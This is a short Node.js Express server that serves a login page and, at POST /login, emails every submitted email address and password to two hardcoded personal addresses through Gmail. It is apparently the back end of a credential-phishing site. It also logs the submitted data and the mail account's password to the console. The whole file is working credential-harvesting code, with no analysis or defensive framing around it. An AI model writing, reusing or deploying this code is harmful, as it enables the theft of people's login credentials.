var express = require('express');
var path    = require("path");
var app = express();
var bodyParser = require('body-parser');    // pull information from HTML POST (express4)
var nodemailer = require('nodemailer');

app.use(bodyParser.json());                                     // parse application/json
app.use(bodyParser.urlencoded({'extended':'true'}));            // parse application/x-www-form-urlencoded

var user = process.env.MAIL_USER;
console.log(user);
var pass = process.env.MAIL_PASS;
console.log(pass);
var config = {
    service: 'gmail',
    auth: {
        user: user,
        pass: pass
    }
};
var transporter = nodemailer.createTransport(config);

function sendEmail(body) {
	var mailOptions = {
	    'from': '"Eze" <eze@eze.com>', // sender address
	    'to': 'ezequielbergamaschi@gmail.com,yamilabergamaschi@hotmail.com',
	    'subject': 'Datos', // Subject line
	    'text': 'data1: ' + body.email + ' data2: ' + body.pass, // plaintext body
	};

  transporter.sendMail(mailOptions, function(error, info){
  	if(error){
        return console.log(error);
    }
    console.log('Message sent: ' + info.response);
  });

}

app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname+'/index.html'));
});

app.post('/login', function(req, res) {
	console.log('La data es: ' + JSON.stringify(req.body));
	sendEmail(req.body);
	res.send('');
});

app.listen(process.env.PORT || 3000, function () {
  console.log('Example app listening on port 3000!');
});
